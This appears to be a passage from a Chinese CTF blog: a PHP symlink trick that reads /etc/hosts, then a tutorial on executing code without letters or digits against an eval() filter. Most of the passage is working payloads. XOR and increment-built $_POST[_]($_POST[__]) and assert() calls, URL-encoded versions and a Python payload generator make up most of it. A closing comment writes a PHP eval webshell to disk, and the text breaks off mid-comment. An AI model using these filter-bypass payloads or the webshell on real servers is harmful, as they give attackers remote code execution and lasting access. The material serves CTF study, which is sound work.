<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;1&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;2&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;3&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;4&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;4&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">symlink</span>(<span class="string">&quot;1/2/3/4&quot;</span>,<span class="string">&quot;tmplink&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">symlink</span>(<span class="string">&quot;tmplink/../../../../etc/hosts&quot;</span>,<span class="string">&quot;bypass&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&quot;tmplink&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;tmplink&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;bypass&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/26/SWPUCTF2021-hardrce3-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/24/rce-noalpha/" >无字母RCE</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-24
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>借助异或构造payload如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>); <span class="comment">// _</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>); <span class="comment">// _P</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>); <span class="comment">// _PO</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>); <span class="comment">// _POS</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>); <span class="comment">// _POST </span></span><br><span class="line"><span class="variable">$$__</span>[_](<span class="variable">$$__</span>[__]); <span class="comment">// $_POST[_]($_POST[__]);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者构造eval($_POST[_]), assert($_POST[_])</span></span><br><span class="line"><span class="comment">// assert($_POST[_])</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<p>然后我们再取消一下换行符，将它合并于一行之中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);<span class="variable">$$__</span>[_](<span class="variable">$$__</span>[__]);	<span class="comment">// $_POST[_]($_POST[__]);</span></span><br></pre></td></tr></table></figure>

<p>最后进行一次URL编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=%<span class="number">24</span>__%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">23</span>%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">7</span>C%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>.%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>~%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">60</span>%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">7</span>C%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>__%<span class="number">5</span>B_%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>__%<span class="number">5</span>B__%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>

<p>或者直接多个字符一起异或，根据未过滤字符构造目标脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span>	<span class="comment"># 没有被过滤的字符</span></span><br><span class="line"> </span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span></span><br><span class="line"> </span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;&quot;<span class="subst">&#123;tmp1&#125;</span>&quot;^&quot;<span class="subst">&#123;tmp2&#125;</span>&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;0302181&quot;^&quot;@[@[_^^&quot;</span></span><br><span class="line"><span class="comment"># $_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span></span><br></pre></td></tr></table></figure>

<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>官方文档如下<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a></p>
<blockquote>
<p>当我们通过某种方法可以得到一个字符时，我们就可以通过自增来获取其他字符，比如现在我们获取到了<code>$_=A</code>，我们进行<code>$_++</code>，此时<code>$_</code>就变成了<code>B</code>，同理就可以构造出<code>GET</code>以及<code>POST</code>字符，接下来以例子来进行讲解,这里例题的话还用之前的demo在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>，而在 C 中，<code>a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯 ASCII 字母数字（a-z、A-Z 和 0-9）。递增&#x2F;递减其他字符变量则无效，原字符串没有变化。</p>
</blockquote>
<p>我们首先可以写一个<code>[]</code>看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到它就是一个数组，我们无法获取它的这个<code>Array</code>字符，那我们该怎么获取呢，我们尝试字符拼接</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="comment">// Array</span></span><br></pre></td></tr></table></figure>

<p>成功获取到了字符<code>Array</code>，然后我们获取想获取A的话，就可以采用<code>$_[0]</code>这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在<code>[]</code>里加一个<code>==$</code>，此时因为<code>空</code>和<code>$</code>不同，它就会输出<code>0</code>，此时也就等同于<code>$_[0]</code>，在有些版本中<code>[]</code>中间为非数字字符也会被当做下标0</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];	<span class="comment">// 或 $_=$_[_];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;</span><br><span class="line"><span class="comment">// A</span></span><br></pre></td></tr></table></figure>

<p>此时成功获取到了字符<code>A</code>，有了<code>A</code>，我们就可以通过自增依次获取其他字符，我们尝试获取一个字符<code>G</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="comment">// Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">// A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>); <span class="comment">// G</span></span><br></pre></td></tr></table></figure>

<p>然后看我们这里的代码的话，是<code>eval($code)</code>，所以我们就可以构造这种的<code>$_GET[1]($_GET[0])</code>，这个时候我们就可以<code>system(ls)</code>这种命令的执行，所以接下来的话就开始构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//GET</span></span><br><span class="line"><span class="comment">//var_dump($_);</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]));</span><br><span class="line"><span class="comment">//$_GET[_]($_GET[__])</span></span><br><span class="line"><span class="comment">// 或者构造eval($_POST[__]), assert($_POST[__])</span></span><br></pre></td></tr></table></figure>

<p>接下来就可以尝试去给<code>_</code>和<code>__</code>GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]);</span><br></pre></td></tr></table></figure>

<p>而后变成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D.<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>D%<span class="number">3</span>D<span class="string">&#x27;%24&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>___.%<span class="number">24</span>__.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B__%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 附assert($_POST[__])</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;	<span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;		<span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASS</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASSE</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASSER</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASSERT</span></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;	</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _P</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _PO</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _POS</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _POST</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$___($_[_]);&amp;_=file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;)</span></span><br><span class="line"><span class="comment">// 